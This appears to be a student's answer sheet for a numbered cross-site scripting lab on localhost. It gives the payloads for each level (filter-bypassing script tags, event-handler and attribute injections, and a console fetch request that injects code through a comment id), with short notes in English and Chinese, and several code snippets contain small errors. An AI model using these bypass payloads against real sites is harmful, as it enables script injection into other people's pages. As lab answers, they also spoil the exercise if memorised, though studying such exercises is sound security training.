# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)
//explanation:the competitor's website is localhost:4010/search
//I spend three days to find out where it is. 
//If I didn't check the code of the server, it will be much longer.(such a nasty design!)
```
<script>success()</script>
```

# 2. No Script Allowed (3 points)
//oh, I see. The browser didn't show the the content in <iframe>. 
//But why,I can't figure it out. The browser don't allow put iframe inside the page?
```
<scscriptript>success()</script>
```

# 3. One More Time, Like You Mean It (3 points)

```
<scriscriptpt>success()</scrscriptipt>
```

# 4. An Open-and-Shut Case (3 points)

```
<ScriPt>success()</sCript>
```

# 5. Time to Mix Things Up (3 points)
//It is the same as 4
```
<ScriPt>success()</sCript>
```

# 6. A Picture is Worth a Thousand Words (3 points)
//this one is funny.
```
<body onload=success()></body>
```

# 7. Between a Rock And a Hard Place (3 points)
//onload,onerror,onpageshow...
```
<body onpageshow=success()></body>
```

# 8. Angle of Death (6 points)

Attack input:

```
<<body onload=success()>>
```

Server code:


```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  
   q = q.replace(/</，'').replace(/>/,'')


  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)
//the most important thing is the input of user becomes one of HTML attributes.
//And they are circled by quotes. So we have to pair the quotes.
//the htmlElementEscape() function doesn't work for the values of HTML attributes.
```
" onload=success()
```

# 11. You Can't Win 'em All (6 points)
//they only filter " for once
Attack input:

```
""onload=success()
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  
   q = q.replace(/"/,'&quot;')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 12. When All is Said and Done (6 points)

Attack input:

```
'onload=success()
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  
   q = /"/g, '&quot;'

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)
//it is actually inject to the body,but why?
//I don't know either.
//I did't find the answer
Attack URL:

```
http://localhost:4140/search?q=1585&lang=es%20onload=success()
```

# 15. The Early Bird Catches the Worm (3 points)
//the solutions are mentioned before on the class.
//If there are multiple pairs of script tags, all of them will be executed.
```
</script><script>onload=success()</script>
```

# 16. Tying Up Loose Ends (3 points)
<!--the </ are filtered only once-->
```
<<//script><script>onload=success()<<//script>
```

# 17. Take a Page Out of Their Book (6 points)
```
漏洞说明：
最开始我以为input是注入点，后来才发现inpput的类型早就固定为text，传来传去还是text，不会被执行。
关键在于下面的源代码语句：
	if(comment.id==null) comment.id = await getNext AvailableIdFromDatabase（）
如果用户提交的req.body中没有id，则自动为用户赋上id。但如果用户有id，则什么都不做（也就是id会被保留）
所以攻击的方式是：把success()放进id中，然后构造POST请求，把构造的comment对象传上去（因为按照这个网页的逻辑，用户没有机会输入id，但是服务器端又可以接收id。所以需要构造POST请求）
关于代码的解释：
	1.fetch API用于提交请求。fetch()强制接受一个参数，即要获取资源的路径（这里指的是‘/comment’）。它返回一个Promise，该Promise会在服务器使用标头响应后，兑现为该请求的Response。
	关于fetch API，详见：
	https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API
	https://developer.mozilla.org/zh-CN/docs/Web/API/fetch
	2.Promise是一个ECMAScript 6提供的类，目的是更加优雅地书写复杂的异步任务。
	关于Promise，详见：
	https://www.runoob.com/js/js-promise.html
	3.JSON是用于存储和传输数据的格式。JSON格式仅仅是一个文本，文本可以被任何编程语言读取，或者作为数据格式传递。JSON语法规则：1,数据为键值对。2.由逗号分隔。3.大括号保存对象。4.方括号保存数组。
	详见：https://www.runoob.com/js/js-json.html
	4.在使用POST请求传递JSON数据时，通常需要将JSON数据转换为字符串格式，然后在请求头中设置Content-Type为application/json.
	5.fetch()接收到的response是一个stream。response.json()是一个异步操作，取出所有内容，并将其转为JSON对象。
	6.windows.location.reload()没有参数（只有firefox支持一个boolean参数），用于刷新当前页面。
	7. ES2017标准引入了async函数，使得异步操作变得更加方便。await函数只能用在async函数中。、async函数会返回一个Promise对象。await命令相当于其后语句返回的Promise对象的then方法。
```
Attack code:
	才发现下面这段代码就在源网页代码中的script标签里，源代码如下：
	
    window.wiggle = (id) => {
      const e = window.event

      console.log(`wiggling comment ${id}`)

      e.target.classList.add('animated', 'jello')
      setTimeout(() => {
        e.target.classList.remove('animated', 'jello')
      }, 1000)
    }

    const $commentForm = document.querySelector('.commentForm')
    const $commentInput = document.querySelector('.commentInput')

    $commentForm.addEventListener('submit', async e => {
      e.preventDefault()

      const comment = {
        text: $commentInput.value,
        id: null() // let server fill this in（I didn't try to modify this id, so I don't know whether it is effective or not if modify id:null() to id:"success()"）
      }

      await window.fetch('/comment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(comment)
      })

      window.location.reload()
    })
  
```js
paste the code below,and put it into console.Then ,execute it.
const comment={
	text:'We will get success!',
	id:"success()"
};
fetch('/comment',{
	method:'POST',
	headers:{
		'Content-Type':'application/json'
	},
        body:JSON.stringify(comment)
})
.then(function(response){
	response.json()
})
.then(function(data){
	console.log(data);
	windows.location.reload();
})
.catch(function(error){
	console.log(error);	
});
```

# 18. Congrats

N/A

# Survey responses (3 points)

